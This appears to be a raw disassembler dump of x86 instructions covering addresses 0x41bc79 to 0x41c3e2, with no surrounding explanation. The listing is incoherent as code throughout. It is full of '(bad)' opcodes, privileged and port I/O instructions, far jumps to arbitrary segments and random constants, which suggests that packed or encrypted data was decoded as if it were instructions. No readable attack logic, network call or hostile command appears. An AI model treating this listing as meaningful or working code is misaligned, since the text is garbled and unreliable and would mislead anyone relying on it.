  41bc79:	mov    BYTE PTR [edi],cl
  41bc7b:	cwde   
  41bc7c:	lods   eax,DWORD PTR ds:[esi]
  41bc7d:	(bad)  
  41bc7e:	or     eax,DWORD PTR [esi]
  41bc80:	and    edx,edx
  41bc82:	adc    al,0xf5
  41bc84:	xchg   esp,eax
  41bc85:	inc    ecx
  41bc86:	add    esi,DWORD PTR [esi-0x57]
  41bc89:	jns    0x41bcf1
  41bc8b:	push   cs
  41bc8c:	lea    ebp,[ebx-0x2f66ea39]
  41bc92:	and    ah,BYTE PTR [ebx+0x1f]
  41bc95:	fisttp DWORD PTR [eax]
  41bc97:	mov    ds:0xef892cd4,eax
  41bc9c:	dec    esi
  41bc9d:	jne    0x41bc22
  41bc9f:	fs mov al,0x3f
  41bca2:	outs   dx,DWORD PTR ds:[esi]
  41bca3:	xor    ebx,DWORD PTR [ebp-0x7]
  41bca6:	dec    esi
  41bca7:	pusha  
  41bca8:	xchg   edx,eax
  41bca9:	jnp    0x41bc3a
  41bcab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcac:	sub    BYTE PTR [ebp+0x2],bl
  41bcaf:	fimul  DWORD PTR [edi-0x2]
  41bcb2:	cmovb  esp,DWORD PTR [eax]
  41bcb5:	xor    ebp,DWORD PTR [edx]
  41bcb7:	pop    ebp
  41bcb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcb9:	fbstp  TBYTE PTR [edx-0x4d687bf5]
  41bcbf:	pop    eax
  41bcc0:	jl     0x41bcf9
  41bcc2:	add    dl,BYTE PTR [ebp+0xa]
  41bcc5:	dec    ebp
  41bcc6:	pop    edi
  41bcc7:	dec    edx
  41bcc8:	sbb    eax,0x3b37aea9
  41bccd:	fst    QWORD PTR [esi-0x1c]
  41bcd0:	or     eax,0xaf62bea5
  41bcd5:	mov    esi,0xbf68b803
  41bcda:	fs stc 
  41bcdc:	push   ss
  41bcdd:	xchg   esi,eax
  41bcde:	jb     0x41bce4
  41bce0:	dec    esi
  41bce1:	adc    esi,esp
  41bce3:	mov    al,ds:0x858d963c
  41bce8:	pop    ebp
  41bce9:	gs sub eax,0xc555100b
  41bcef:	add    al,0x9d
  41bcf1:	pop    esi
  41bcf2:	pushf  
  41bcf3:	in     al,0xbb
  41bcf5:	outs   dx,DWORD PTR ds:[esi]
  41bcf6:	xor    eax,0x8d9435e2
  41bcfb:	xchg   esi,eax
  41bcfc:	dec    ebp
  41bcfd:	(bad)  
  41bcfe:	ds scas al,BYTE PTR es:[edi]
  41bd00:	les    eax,FWORD PTR es:[eax+0x40d8f9ee]
  41bd07:	in     eax,dx
  41bd08:	xchg   DWORD PTR [ebx],ebp
  41bd0a:	les    eax,FWORD PTR [eax]
  41bd0c:	sbb    eax,0xbadb94c
  41bd11:	test   DWORD PTR ds:0x758b34e6,0xf6823473
  41bd1b:	mov    ecx,edi
  41bd1d:	mov    dl,0xc7
  41bd1f:	fsubr  DWORD PTR [edi]
  41bd21:	inc    edx
  41bd22:	and    ch,bh
  41bd24:	jle    0x41bd6a
  41bd26:	fstp   DWORD PTR [esi-0x6e4382ea]
  41bd2c:	mov    esp,0x9e2e52fa
  41bd31:	fs cwde 
  41bd33:	and    edx,0x29b62fff
  41bd39:	push   ebp
  41bd3a:	dec    ebp
  41bd3b:	addr16 dec edi
  41bd3d:	mov    ecx,ds
  41bd3f:	aas    
  41bd40:	jmp    0x41bceb
  41bd42:	jl     0x41bd26
  41bd44:	jmp    0x7f79:0x8ffe1b0e
  41bd4b:	mov    ss,esp
  41bd4d:	out    0xcd,eax
  41bd4f:	lods   eax,DWORD PTR ds:[esi]
  41bd50:	pop    ds
  41bd51:	gs adc al,0xef
  41bd54:	aas    
  41bd55:	mov    ds:0x67940089,eax
  41bd5b:	test   al,0xdb
  41bd5d:	adc    al,0x62
  41bd5f:	mov    ebx,DWORD PTR [esi-0x266bd4d4]
  41bd65:	mov    eax,0x9c5b4c77
  41bd6a:	cli    
  41bd6b:	jmp    0x3a43:0xbcd4d49d
  41bd72:	repz jae 0x41bdae
  41bd75:	repnz fxtract 
  41bd78:	sub    DWORD PTR [eax],ebx
  41bd7a:	ja     0x41bde5
  41bd7c:	fist   WORD PTR [eax]
  41bd7e:	or     ch,BYTE PTR [ebx]
  41bd80:	int    0x4
  41bd82:	jle    0x41bde4
  41bd84:	iret   
  41bd85:	nop
  41bd86:	xor    BYTE PTR [ebx],ah
  41bd88:	push   esi
  41bd89:	aad    0xda
  41bd8b:	jo     0x41bd86
  41bd8d:	push   esp
  41bd8e:	mov    WORD PTR [edx-0x328d4628],cs
  41bd94:	jnp    0x41be01
  41bd96:	and    ah,BYTE PTR [ebx-0x27]
  41bd99:	mov    al,ds:0xcdaa8342
  41bd9e:	or     BYTE PTR [ebp-0x51697e3c],0xe3
  41bda5:	ins    DWORD PTR es:[edi],dx
  41bda6:	bound  ebx,QWORD PTR ds:0x7f81229a
  41bdac:	repnz add eax,0x74cddec4
  41bdb2:	ds or  eax,0xc6fa1cfe
  41bdb8:	and    ch,BYTE PTR [ebx-0x40baf294]
  41bdbe:	fcomp  st(2)
  41bdc0:	inc    esp
  41bdc1:	sub    al,0xd7
  41bdc3:	fild   WORD PTR [edi+ebx*1]
  41bdc6:	pop    esi
  41bdc7:	lock shr esi,cl
  41bdca:	xchg   esi,eax
  41bdcb:	mov    ebx,0xc8b137ee
  41bdd0:	cmp    dh,ah
  41bdd2:	jno    0x41bddc
  41bdd4:	bound  esp,QWORD PTR [edi-0x8]
  41bdd7:	sahf   
  41bdd8:	pop    esp
  41bdd9:	and    DWORD PTR [ebx-0x3c0162d2],edx
  41bddf:	jp     0x41be12
  41bde1:	scas   al,BYTE PTR es:[edi]
  41bde2:	not    BYTE PTR [esi]
  41bde4:	sub    ch,BYTE PTR [ecx]
  41bde6:	lea    eax,[ecx]
  41bde8:	pop    ss
  41bde9:	ins    DWORD PTR es:[edi],dx
  41bdea:	dec    edi
  41bdeb:	adc    DWORD PTR [ebx+0x5159f8c0],ebx
  41bdf1:	(bad)  
  41bdf2:	fsub   QWORD PTR [edx+0x20]
  41bdf5:	test   eax,0xbbdaf280
  41bdfa:	mov    ecx,DWORD PTR [ecx]
  41bdfc:	fadd   DWORD PTR [ebp+0x61b45fda]
  41be02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be03:	jmp    0xe5a84e8b
  41be08:	mov    dh,0xb6
  41be0a:	stc    
  41be0b:	mov    eax,es:0x3c445283
  41be11:	out    dx,eax
  41be12:	push   ebx
  41be13:	sahf   
  41be14:	sub    edi,esi
  41be16:	je     0x41bdd6
  41be18:	add    eax,0xe15d0b3b
  41be1d:	lea    ecx,[ebx]
  41be1f:	xor    BYTE PTR [ebp-0x194f92a6],cl
  41be25:	shr    BYTE PTR [ecx-0x1d014d2e],0x74
  41be2c:	mov    edi,0xa1303443
  41be31:	and    bl,0x3e
  41be34:	inc    ecx
  41be35:	sbb    eax,ebp
  41be37:	jae    0x41be79
  41be39:	in     eax,0x87
  41be3b:	jbe    0x41be68
  41be3d:	ja     0x41beb8
  41be3f:	in     eax,dx
  41be40:	jmp    0xa3e6:0xc5e7ae18
  41be47:	pushf  
  41be48:	inc    edx
  41be49:	adc    DWORD PTR [edi-0x169aa3bd],edi
  41be4f:	call   0x62d8:0x1a81b600
  41be56:	dec    ecx
  41be57:	(bad)  
  41be58:	lods   al,BYTE PTR ds:[esi]
  41be59:	inc    edx
  41be5a:	arpl   WORD PTR [ebp-0x585a92b8],bp
  41be60:	popf   
  41be61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be62:	js     0x41be62
  41be64:	test   edx,ecx
  41be66:	or     DWORD PTR [eax],ebx
  41be68:	gs pop ds
  41be6a:	shr    BYTE PTR [ebx+0xd],1
  41be6d:	shl    BYTE PTR [edi],1
  41be6f:	dec    edi
  41be70:	test   dl,cl
  41be72:	adc    al,0x56
  41be74:	repnz add BYTE PTR [ebp+0xb],al
  41be78:	push   ss
  41be79:	mov    dh,0x94
  41be7b:	xor    eax,DWORD PTR [ecx+eax*8+0x2df0aeb3]
  41be82:	pause  
  41be84:	sub    ebx,DWORD PTR [ebx+0x2f]
  41be87:	fistp  DWORD PTR [ebx-0x24]
  41be8a:	sub    eax,0xccb05734
  41be8f:	sub    BYTE PTR [edx],dl
  41be91:	mov    ah,0xa2
  41be93:	int3   
  41be94:	in     eax,0x56
  41be96:	jne    0x41bf0f
  41be98:	outs   dx,DWORD PTR ds:[esi]
  41be99:	dec    ebp
  41be9a:	test   DWORD PTR [edi+0x2039f399],ebx
  41bea0:	loope  0x41be8c
  41bea2:	sbb    DWORD PTR [esi+0x3f],ecx
  41bea5:	jmp    0x41be88
  41bea7:	jae    0x41be53
  41bea9:	into   
  41beaa:	ins    DWORD PTR es:[edi],dx
  41beab:	mov    ch,0x86
  41bead:	mov    ?,ebx
  41beaf:	sbb    edi,esi
  41beb1:	loop   0x41be5f
  41beb3:	xlat   BYTE PTR fs:[ebx]
  41beb5:	push   es
  41beb6:	sub    dl,BYTE PTR [ebx]
  41beb8:	mov    ds,WORD PTR [esi+0x2919f604]
  41bebe:	pop    ss
  41bebf:	imul   ebp,DWORD PTR [ecx+0x1120e6a3],0x59cb4f9e
  41bec9:	aad    0x61
  41becb:	inc    esp
  41becc:	prefetch BYTE PTR [ecx+0x76]
  41bed0:	int3   
  41bed1:	ror    DWORD PTR [ecx],1
  41bed3:	jne    0x41be87
  41bed5:	in     eax,0xae
  41bed7:	(bad)  
  41bed9:	ja     0x41be93
  41bedb:	nop
  41bedc:	mov    WORD PTR [eax+eax*1],ss
  41bedf:	xchg   DWORD PTR [ebx+eiz*2-0x5671f29c],edi
  41bee6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bee7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bee8:	in     eax,0xda
  41beea:	xchg   BYTE PTR [edx],bl
  41beec:	jg     0x41bed9
  41beee:	or     cl,BYTE PTR [edi]
  41bef0:	fwait
  41bef1:	cmp    eax,0xa35b922
  41bef6:	(bad)  ds:0x17c96cd4
  41befc:	xor    eax,0x5d143a1e
  41bf01:	outs   dx,DWORD PTR ds:[esi]
  41bf02:	mov    esi,DWORD PTR [esi+ebx*2]
  41bf05:	jmp    0xc2f56922
  41bf0a:	(bad)  
  41bf0b:	repz imul edi,edx,0xffffff8d
  41bf0f:	and    ebx,edx
  41bf11:	emms   
  41bf13:	or     eax,0x9a344e61
  41bf18:	pop    ebx
  41bf19:	sub    BYTE PTR ds:0x4e170b04,cl
  41bf1f:	push   0x64
  41bf21:	push   esi
  41bf22:	clc    
  41bf23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf24:	mov    bl,BYTE PTR [ecx]
  41bf26:	add    dh,ah
  41bf28:	sub    eax,0x8ed40452
  41bf2d:	lods   al,BYTE PTR ds:[esi]
  41bf2e:	xor    ebx,DWORD PTR [ebx+0x7e53963f]
  41bf34:	inc    edx
  41bf35:	scas   eax,DWORD PTR es:[edi]
  41bf36:	push   eax
  41bf37:	jge    0x41bf4e
  41bf39:	sbb    eax,0xb535782c
  41bf3e:	push   esi
  41bf3f:	cli    
  41bf40:	inc    eax
  41bf41:	push   0xba968c2e
  41bf46:	jl     0x41beda
  41bf48:	fld    TBYTE PTR [ebx]
  41bf4a:	fwait
  41bf4b:	cld    
  41bf4c:	ins    BYTE PTR es:[edi],dx
  41bf4d:	and    al,0x1a
  41bf4f:	xchg   ebp,eax
  41bf50:	cld    
  41bf51:	dec    ebp
  41bf52:	mov    ds:0xfe046670,al
  41bf57:	mov    eax,0x7b313337
  41bf5c:	xchg   esi,eax
  41bf5d:	dec    ebx
  41bf5e:	dec    esi
  41bf5f:	jae    0x41bfdb
  41bf61:	fldcw  WORD PTR [edx]
  41bf63:	test   eax,0xf7382d9c
  41bf68:	scas   al,BYTE PTR es:[edi]
  41bf69:	jmp    0xe822:0x6b05c7a2
  41bf70:	ins    DWORD PTR es:[edi],dx
  41bf71:	sar    DWORD PTR [esi-0x4374f523],0xbc
  41bf78:	outs   dx,DWORD PTR ds:[esi]
  41bf79:	ins    DWORD PTR es:[edi],dx
  41bf7a:	cmp    BYTE PTR [esi+edx*2-0x4d],ch
  41bf7e:	mov    bl,0xe2
  41bf80:	fcom   DWORD PTR [edi+0x12]
  41bf83:	lock inc ebx
  41bf85:	and    DWORD PTR [edi-0x35],ebx
  41bf88:	daa    
  41bf89:	jnp    0x41bf36
  41bf8b:	sbb    cl,BYTE PTR [esp+edx*4-0x12a27ede]
  41bf92:	jnp    0x41bf46
  41bf94:	rcr    BYTE PTR [ebp+0x44aa8a8a],cl
  41bf9a:	jg     0x41bf29
  41bf9c:	rcl    BYTE PTR [ecx-0x70],0x84
  41bfa0:	ins    DWORD PTR es:[edi],dx
  41bfa1:	stc    
  41bfa2:	jo     0x41bff0
  41bfa4:	fwait
  41bfa5:	cli    
  41bfa6:	mov    dh,al
  41bfa8:	fmul   DWORD PTR [edi]
  41bfaa:	inc    ebx
  41bfab:	(bad)  
  41bfac:	mov    ds:0xb8fbfc54,al
  41bfb1:	inc    esp
  41bfb2:	mov    eax,ds:0xcd3603ef
  41bfb7:	cmp    esi,esi
  41bfb9:	jns    0x41bf41
  41bfbb:	sub    ah,dh
  41bfbd:	mov    edx,db0
  41bfc0:	outs   dx,DWORD PTR ds:[esi]
  41bfc1:	jmp    0x7c86:0x615b59cd
  41bfc8:	mov    ds:0x37cd9c46,al
  41bfcd:	aas    
  41bfce:	sub    edx,DWORD PTR [edi]
  41bfd0:	out    dx,al
  41bfd1:	xor    DWORD PTR [ecx],ecx
  41bfd3:	jno    0x41bf86
  41bfd5:	fwait
  41bfd6:	retf   0xa58f
  41bfd9:	test   DWORD PTR [edx+0x76],edx
  41bfdc:	pop    ecx
  41bfdd:	ins    DWORD PTR es:[edi],dx
  41bfde:	mov    eax,ds:0x26d49855
  41bfe3:	xchg   edx,eax
  41bfe4:	mov    dh,0xd2
  41bfe6:	arpl   WORD PTR [ebx-0x2d],si
  41bfe9:	rcr    DWORD PTR [esp+esi*8+0x72],0x1
  41bfee:	stos   BYTE PTR es:[edi],al
  41bfef:	push   ecx
  41bff0:	push   edi
  41bff1:	enter  0x6b61,0x58
  41bff5:	or     BYTE PTR [bp+di],ah
  41bff8:	cmc    
  41bff9:	push   esi
  41bffa:	call   0xb165:0x3e146917
  41c001:	mov    dh,0xf2
  41c003:	in     eax,dx
  41c004:	fsubr  DWORD PTR [ebp-0x49]
  41c007:	clc    
  41c008:	inc    ebp
  41c009:	mov    edx,0xc4a61ec4
  41c00e:	sub    BYTE PTR [ecx],dh
  41c010:	jge    0x41bfa5
  41c012:	test   DWORD PTR [ebx+0x1941badb],edx
  41c018:	sbb    BYTE PTR [eax-0x42],cl
  41c01b:	stc    
  41c01c:	sbb    eax,0x3d6e01d4
  41c021:	ins    BYTE PTR es:[edi],dx
  41c022:	retf   
  41c023:	icebp  
  41c024:	repz mov eax,ds:0x3c21dff5
  41c02a:	out    0x8b,al
  41c02c:	push   0x48
  41c02e:	inc    esp
  41c02f:	daa    
  41c030:	and    DWORD PTR [edx],0x11
  41c033:	pusha  
  41c034:	mov    eax,ds:0xf9ee7dbf
  41c039:	fist   WORD PTR [edx+0x7b]
  41c03c:	mov    bh,0x6f
  41c03e:	inc    ebp
  41c03f:	sar    BYTE PTR [edi-0x714a511e],1
  41c045:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c046:	scas   al,BYTE PTR es:[edi]
  41c047:	mov    ebx,esi
  41c049:	ret    0x42c
  41c04c:	dec    ebp
  41c04d:	sub    eax,ebx
  41c04f:	push   ds
  41c050:	clc    
  41c051:	pop    ebx
  41c052:	cli    
  41c053:	nop
  41c054:	sbb    BYTE PTR [ecx],dh
  41c056:	inc    esi
  41c057:	push   eax
  41c058:	jno    0x41c081
  41c05a:	pop    edi
  41c05b:	pop    ecx
  41c05c:	sub    bl,BYTE PTR [edx+0x4fda805e]
  41c062:	(bad)
  41c065:	loop   0x41c092
  41c067:	inc    esp
  41c068:	inc    ebx
  41c069:	dec    ebx
  41c06a:	jl     0x41bffd
  41c06c:	stos   BYTE PTR es:[edi],al
  41c06d:	jmp    0x470f7a2
  41c072:	ins    BYTE PTR es:[edi],dx
  41c073:	or     ah,al
  41c075:	test   eax,0xc048e24c
  41c07a:	pop    edx
  41c07b:	adc    esp,DWORD PTR [ebp+0x18]
  41c07e:	lods   al,BYTE PTR ds:[esi]
  41c07f:	in     eax,0x1a
  41c081:	fidivr DWORD PTR gs:[eax-0x54e94562]
  41c088:	setno  BYTE PTR [ecx]
  41c08b:	int    0xd3
  41c08d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c08e:	leave  
  41c08f:	pop    esi
  41c090:	add    BYTE PTR [edx],0x94
  41c093:	fisubr DWORD PTR [edx-0x7a8ea588]
  41c099:	test   BYTE PTR [edx+0x70],ch
  41c09c:	and    dh,BYTE PTR [edx-0x882b1ff]
  41c0a2:	and    eax,0x16f700e9
  41c0a7:	rcl    DWORD PTR [edi-0x3623d570],0xc6
  41c0ae:	fcom   DWORD PTR [bx+0x15]
  41c0b2:	jl     0x41c051
  41c0b4:	mov    ds:0x2eb3db05,al
  41c0b9:	bound  ecx,QWORD PTR [edi+0x25f7559b]
  41c0bf:	shr    BYTE PTR [edi-0x4b414d14],1
  41c0c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0c6:	xchg   esi,eax
  41c0c7:	lods   al,BYTE PTR ds:[esi]
  41c0c8:	ficomp WORD PTR [eax-0x60]
  41c0cb:	jne    0x41c0a4
  41c0cd:	fld    QWORD PTR gs:[ebp+0x7fdb95d4]
  41c0d4:	repnz in eax,0xc
  41c0d7:	int    0xd1
  41c0d9:	xchg   ebx,eax
  41c0da:	xlat   BYTE PTR ds:[ebx]
  41c0db:	outs   dx,DWORD PTR ds:[esi]
  41c0dc:	(bad)  
  41c0de:	leave  
  41c0df:	lods   al,BYTE PTR ds:[esi]
  41c0e0:	or     al,0xb2
  41c0e2:	rcl    ah,0xf1
  41c0e5:	sbb    dh,BYTE PTR [ebx]
  41c0e7:	clc    
  41c0e8:	jmp    0x41c5fa
  41c0ed:	(bad)  
  41c0ee:	int    0xce
  41c0f0:	(bad)  
  41c0f1:	aad    0xd5
  41c0f3:	(bad)  
  41c0f4:	int    0x5f
  41c0f6:	sahf   
  41c0f7:	pusha  
  41c0f8:	mov    WORD PTR [edi],ds
  41c0fa:	rcl    DWORD PTR ds:0x7f9aaeb7,cl
  41c100:	js     0x41c175
  41c102:	jl     0x41c17c
  41c104:	js     0x41c0cf
  41c106:	mov    es,ebp
  41c108:	daa    
  41c109:	pushf  
  41c10a:	mov    edx,0x455f0bf
  41c10f:	adc    edx,DWORD PTR [ebx+0x145d0cf9]
  41c115:	wrmsr  
  41c117:	mov    WORD PTR [edx-0x47],fs
  41c11a:	xor    dl,BYTE PTR [edx]
  41c11c:	xchg   esi,eax
  41c11d:	cdq    
  41c11e:	push   esi
  41c11f:	sub    DWORD PTR [ebx+0x9],0x28
  41c123:	pusha  
  41c124:	int    0x19
  41c126:	repnz outs dx,BYTE PTR ds:[esi]
  41c128:	mov    bh,0x89
  41c12a:	(bad)  
  41c12b:	(bad)  
  41c12c:	cmp    DWORD PTR [ebx+0x5b],edi
  41c12f:	in     al,dx
  41c130:	cmp    ebp,ebx
  41c132:	inc    esi
  41c133:	inc    eax
  41c134:	js     0x41c13b
  41c136:	mov    esi,ebp
  41c138:	enter  0xbd65,0xd2
  41c13c:	sbb    eax,0xf4205d62
  41c141:	mov    WORD PTR gs:[ecx],gs
  41c144:	dec    ebp
  41c145:	xor    eax,0x46972790
  41c14a:	(bad)  
  41c14c:	push   edx
  41c14d:	(bad)  
  41c14e:	int3   
  41c14f:	(bad)  
  41c150:	jb     0x41c0fa
  41c152:	or     edi,DWORD PTR [ecx-0xd32f1d0]
  41c158:	clc    
  41c159:	dec    esp
  41c15a:	popa   
  41c15b:	cwde   
  41c15c:	outs   dx,DWORD PTR ds:[esi]
  41c15d:	sub    al,0x17
  41c15f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c160:	xchg   DWORD PTR [edx],esi
  41c162:	pop    esp
  41c163:	loopne 0x41c1a1
  41c165:	xor    dh,bl
  41c167:	aas    
  41c168:	enter  0x7d6,0x25
  41c16c:	shl    bh,0xa5
  41c16f:	imul   DWORD PTR [eax]
  41c171:	sub    edi,DWORD PTR [esi+0x4a]
  41c174:	adc    eax,0x1bf80dec
  41c179:	sub    eax,0x78
  41c17c:	das    
  41c17d:	cmp    DWORD PTR [ebp+0x11],0x1a118d90
  41c184:	add    eax,0xa01c4c8c
  41c189:	adc    ebx,esp
  41c18b:	sub    al,0xc3
  41c18d:	and    esp,ebx
  41c18f:	dec    edx
  41c190:	pop    ds
  41c191:	(bad)  
  41c192:	cmp    ch,bh
  41c194:	mov    dl,bh
  41c196:	fwait
  41c197:	add    eax,0xe9294e57
  41c19c:	add    al,0x11
  41c19e:	call   0xa01a:0x858dae28
  41c1a5:	xchg   edx,eax
  41c1a6:	imul   edi,DWORD PTR [edi-0x165128e0],0xba92f35e
  41c1b0:	ins    DWORD PTR es:[edi],dx
  41c1b1:	fnstenv [esi+0x34]
  41c1b4:	out    0x24,al
  41c1b6:	fdiv   st(5),st
  41c1b8:	mov    DWORD PTR [edi-0x4e635116],eax
  41c1be:	push   ss
  41c1bf:	(bad)
  41c1c4:	je     0x41c161
  41c1c6:	(bad)  
  41c1c7:	add    al,cl
  41c1c9:	outs   dx,BYTE PTR ds:[esi]
  41c1ca:	jne    0x41c1a0
  41c1cc:	push   ebp
  41c1cd:	sbb    ebp,ecx
  41c1cf:	mov    WORD PTR [ecx-0x5b039b4f],fs
  41c1d5:	shl    BYTE PTR ds:0xbae2acc4,0x6b
  41c1dc:	(bad)  
  41c1de:	sub    ah,BYTE PTR [ebx+esi*2-0x2d]
  41c1e2:	(bad)  
  41c1e3:	xlat   BYTE PTR ds:[ebx]
  41c1e4:	jae    0x41c18c
  41c1e6:	add    DWORD PTR [ebx-0x26],edx
  41c1e9:	cdq    
  41c1ea:	cmp    eax,0xc9a07534
  41c1ef:	cmp    eax,0xd7d8368f
  41c1f4:	mov    eax,0x8dddede0
  41c1f9:	jo     0x41c279
  41c1fb:	adc    edi,DWORD PTR [esi+ecx*8-0x7f]
  41c1ff:	retf   0xa9b1
  41c202:	fcom   QWORD PTR [ebp+0x72a49dd7]
  41c208:	xchg   ebp,eax
  41c209:	dec    eax
  41c20a:	sti    
  41c20b:	shl    DWORD PTR [eax-0x49bf9d1a],cl
  41c211:	dec    esi
  41c212:	sbb    ecx,esi
  41c214:	xchg   esp,eax
  41c215:	popf   
  41c216:	jbe    0x41c236
  41c218:	pop    eax
  41c219:	mov    ebp,0x90cb7a28
  41c21e:	stos   BYTE PTR es:[edi],al
  41c21f:	push   ds
  41c220:	pop    ds
  41c221:	push   esi
  41c222:	ret    0xf989
  41c225:	loope  0x41c280
  41c227:	loopne 0x41c1bf
  41c229:	add    DWORD PTR [edx+0x4541f0fa],0x79cb27c3
  41c233:	ja     0x41c257
  41c235:	or     al,BYTE PTR [ebx-0x69]
  41c238:	push   0x4ccaf48f
  41c23d:	jp     0x41c256
  41c23f:	lahf   
  41c240:	fcom   QWORD PTR [esi+eiz*4-0x63]
  41c244:	cmp    al,0xcf
  41c246:	adc    di,WORD PTR [edi-0x2f7e38a0]
  41c24d:	stos   DWORD PTR es:[edi],eax
  41c24e:	out    dx,al
  41c24f:	add    dl,BYTE PTR [ecx-0x67c5090e]
  41c255:	int    0xb5
  41c257:	mov    cl,0x7c
  41c259:	xchg   esp,eax
  41c25a:	or     DWORD PTR [ecx+0x63d9a1d8],esp
  41c260:	cmp    BYTE PTR [ebx-0x5441ff62],ch
  41c266:	xor    DWORD PTR [esi+0x58eb36c3],eax
  41c26c:	fnsave [bx+si]
  41c26f:	and    BYTE PTR [esi+0x1c],ah
  41c272:	adc    BYTE PTR [eax+edx*8-0x38f48396],dh
  41c279:	es jo  0x41c2e4
  41c27c:	call   0x3ebca66f
  41c281:	scas   al,BYTE PTR es:[edi]
  41c282:	xor    DWORD PTR [eax+0x6effba6f],0x9bf76cc6
  41c28c:	adc    al,0xb4
  41c28e:	out    0xb9,al
  41c290:	aaa    
  41c291:	pop    esp
  41c292:	sar    BYTE PTR [eax-0x7a],cl
  41c295:	test   BYTE PTR [eax],dl
  41c297:	push   ebp
  41c298:	(bad)  
  41c29a:	ja     0x41c260
  41c29c:	or     DWORD PTR [eax-0x30],0xffffffb8
  41c2a0:	sahf   
  41c2a1:	out    0xae,al
  41c2a3:	fwait
  41c2a4:	push   eax
  41c2a5:	loope  0x41c302
  41c2a7:	out    0x64,eax
  41c2a9:	aas    
  41c2aa:	jp     0x41c305
  41c2ac:	fisubr WORD PTR [edi-0x26]
  41c2af:	sbb    al,bl
  41c2b1:	or     DWORD PTR [edi],ecx
  41c2b3:	(bad)  
  41c2b4:	mov    al,ds:0x15354287
  41c2b9:	sbb    al,0x3b
  41c2bb:	pop    ds
  41c2bc:	lods   eax,DWORD PTR ds:[esi]
  41c2bd:	cmp    edi,DWORD PTR [eax-0x4a]
  41c2c0:	dec    esp
  41c2c1:	add    BYTE PTR [ecx],dl
  41c2c3:	lds    edi,FWORD PTR [edx]
  41c2c5:	sbb    eax,0x28c24727
  41c2ca:	xor    ch,BYTE PTR [esi+0x4b]
  41c2cd:	adc    eax,0xd4a3a29e
  41c2d2:	scas   eax,DWORD PTR es:[edi]
  41c2d3:	xor    DWORD PTR [bx+si-0x27],0xfffffff6
  41c2d8:	xchg   ecx,eax
  41c2d9:	push   ds
  41c2da:	fld    QWORD PTR [ecx-0x34]
  41c2dd:	(bad)  
  41c2de:	mov    bh,0xf4
  41c2e0:	sbb    eax,0x527bb554
  41c2e5:	call   0xbc98b777
  41c2ea:	les    ebx,FWORD PTR [eax-0x4f97d983]
  41c2f0:	pop    edi
  41c2f1:	sub    bl,dl
  41c2f3:	pop    es
  41c2f4:	cmp    BYTE PTR [ebx],bl
  41c2f6:	aaa    
  41c2f7:	push   ebp
  41c2f8:	sub    eax,0xd68e4e1b
  41c2fd:	mov    ds:0xb5c180c0,eax
  41c302:	leave  
  41c303:	out    0x47,al
  41c305:	jbe    0x41c298
  41c307:	call   0x2748:0xac67aea3
  41c30e:	mov    esp,0xb8dbd11
  41c313:	test   BYTE PTR [esi+0x23],0x98
  41c317:	aas    
  41c318:	jle    0x41c2f8
  41c31a:	scas   eax,DWORD PTR es:[edi]
  41c31b:	hlt    
  41c31c:	push   0x18624b85
  41c321:	imul   edi,ecx,0xfffffff3
  41c324:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c325:	shl    DWORD PTR [ecx+0x6d],0xf3
  41c329:	(bad)  
  41c32a:	es jmp 0x22c9:0xe06d3cc6
  41c332:	fwait
  41c333:	cs scas eax,DWORD PTR es:[edi]
  41c335:	mov    ebx,0x1bd9db18
  41c33a:	dec    ebp
  41c33b:	xchg   esi,eax
  41c33c:	out    dx,al
  41c33d:	dec    edx
  41c33e:	or     dh,BYTE PTR [ebp+ecx*8-0x26]
  41c342:	xchg   esp,eax
  41c343:	pop    ebp
  41c344:	or     al,0xa2
  41c346:	fdivr  DWORD PTR [ebx]
  41c348:	add    eax,0xc93cd39
  41c34d:	jmp    0x884f7607
  41c352:	ins    BYTE PTR es:[edi],dx
  41c353:	dec    esi
  41c354:	pop    ds
  41c355:	add    ecx,DWORD PTR [ebx-0x65]
  41c358:	push   ecx
  41c359:	sub    eax,0xe5504089
  41c35e:	and    DWORD PTR [ecx],ebx
  41c360:	sub    al,0xd1
  41c362:	sub    ebx,esp
  41c364:	mov    bl,0x3b
  41c366:	cmp    BYTE PTR [edi+0x10],dl
  41c369:	scas   eax,DWORD PTR es:[edi]
  41c36a:	push   0x80e75352
  41c36f:	aam    0x78
  41c371:	sub    ecx,DWORD PTR [ebx]
  41c373:	xor    edi,DWORD PTR [ebx]
  41c375:	mov    cl,0xd5
  41c377:	xor    bh,bl
  41c379:	test   eax,0xe14c0ea1
  41c37e:	lea    edi,[ecx+0x53]
  41c381:	retf   0xd0fa
  41c384:	mov    ecx,0xbfc81be3
  41c389:	xor    DWORD PTR [ebp+0x1c2a0f4],0x7393404
  41c393:	dec    ecx
  41c394:	add    al,0xa
  41c396:	lock div DWORD PTR [eax+0x64]
  41c39a:	das    
  41c39b:	in     eax,0x29
  41c39d:	aam    0xd4
  41c39f:	arpl   sp,si
  41c3a1:	pop    ss
  41c3a2:	push   ds
  41c3a3:	mov    BYTE PTR [edi-0x360c2b68],ch
  41c3a9:	xor    ebp,DWORD PTR [ebx+0x284a9772]
  41c3af:	retf   0x7f0f
  41c3b2:	sbb    DWORD PTR [edx-0x365253b5],edi
  41c3b8:	inc    ebx
  41c3b9:	sbb    edx,DWORD PTR [eax+0x7cd8f4c5]
  41c3bf:	pop    es
  41c3c0:	(bad)  
  41c3c1:	retf   
  41c3c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3c3:	jg     0x41c430
  41c3c5:	nop
  41c3c6:	mov    cl,0x8b
  41c3c8:	add    DWORD PTR [ebx+0x1e],eax
  41c3cb:	call   0xb9ca2c34
  41c3d0:	sti    
  41c3d1:	dec    edx
  41c3d2:	rcr    DWORD PTR [eax+0x31],cl
  41c3d5:	jmp    0x8977:0x4492f5b
  41c3dc:	repz adc al,0x16
  41c3df:	pop    ebp
  41c3e0:	add    cl,al
  41c3e2:	mov    edi,DWORD PTR [eax+edx*8-0x76]
